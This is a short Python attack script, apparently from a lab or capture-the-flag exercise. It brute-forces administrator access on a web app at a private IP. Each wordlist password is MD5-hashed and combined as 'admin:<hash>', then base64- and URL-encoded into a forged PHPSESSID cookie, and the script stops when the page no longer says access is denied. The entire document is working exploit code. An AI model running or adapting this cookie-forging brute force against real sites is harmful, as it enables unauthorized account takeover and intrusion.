import hashlib, requests, base64
from urllib.parse import quote

word_list= "./.passwords_list.txt"
admin_url = "http://10.48.141.248/administration.php"

print("Chuong trinh brute-force cookie!")
with open(word_list, "r", encoding="utf-8") as f:
    for password in f:
        hash_md5 = hashlib.md5(password.strip().encode(encoding="utf-8")).hexdigest()
        plain = "admin:" + hash_md5
        cookies = { "PHPSESSID": quote(base64.b64encode(plain.encode(encoding="utf-8")).decode(encoding="utf-8")) }
        response = requests.get(admin_url,cookies=cookies)
        if "Access denied, only the admin can access this page." not in response.text:
            print(f"[+] Password Found: {password}")
            break
